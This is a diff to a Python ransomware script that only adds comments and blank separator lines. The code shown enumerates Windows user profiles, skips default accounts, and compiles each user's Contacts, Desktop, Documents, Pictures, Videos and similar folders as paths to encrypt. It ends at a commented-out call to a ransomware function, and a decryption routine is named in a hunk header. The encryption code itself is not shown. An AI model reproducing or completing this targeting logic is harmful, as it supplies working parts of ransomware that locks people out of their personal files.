@@ -131,18 +131,32 @@ def deransomware(dirsToEncrypt):
 def enumerate_users():
 
     users = []
+    
+    #------------------------------------#
 
     # Path where user profiles are stored
     user_profiles_path = 'C:/Users/'
+    
+    #------------------------------------#
 
     # Get a list of all user directories in the user profiles path
     user_directories = glob.glob(os.path.join(user_profiles_path, '*'))
+    
+    #------------------------------------#
 
     for user_dir in user_directories:
+    
         documents_folder = os.path.join(user_dir, 'Documents')
+        
+        # If a documents folder exists, so does the user.
         if os.path.exists(documents_folder):
+        
+            # Get the user's name from the folder path
             user = str(os.path.basename(user_dir))
+            
+            # Skip default Windows "users"
             if user != "All Users" and user != "Default" and user != "Default User" and user != "Public":
+            
                 print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] User found: [{bcolors.OKCYAN}"+user+f"{bcolors.ENDC}]")
                 users.append(user_dir)
     
@@ -155,12 +169,18 @@ if __name__ == '__main__':
     # Enumerate all users on the machine.
     users = enumerate_users()
     
+    #------------------------------------#
+    
+    # For each user on the machine...
     for user_dir in users:
     
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] User: [{bcolors.OKCYAN}"+user_dir+f"{bcolors.ENDC}]")
     
+        #------------------------------------#
+    
         # Generate file paths for this user.
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating file paths to encrypt...")
+        
         contactsFolder = os.path.join(user_dir, 'Contacts')
         desktopFolder = os.path.join(user_dir, 'Desktop')
         documentsFolder = os.path.join(user_dir, 'Documents')
@@ -171,6 +191,7 @@ if __name__ == '__main__':
         videosFolder = os.path.join(user_dir, 'Videos')
         
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generated file paths to encrypt:")
+        
         print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+contactsFolder+f"{bcolors.ENDC}]")
         print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+desktopFolder+f"{bcolors.ENDC}]")
         print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+documentsFolder+f"{bcolors.ENDC}]")
@@ -190,6 +211,8 @@ if __name__ == '__main__':
             picturesFolder,
             videosFolder,
         ]
+        
+        #------------------------------------#
         
         # Encrypt everything!
         # ransomware(commonDirectories)
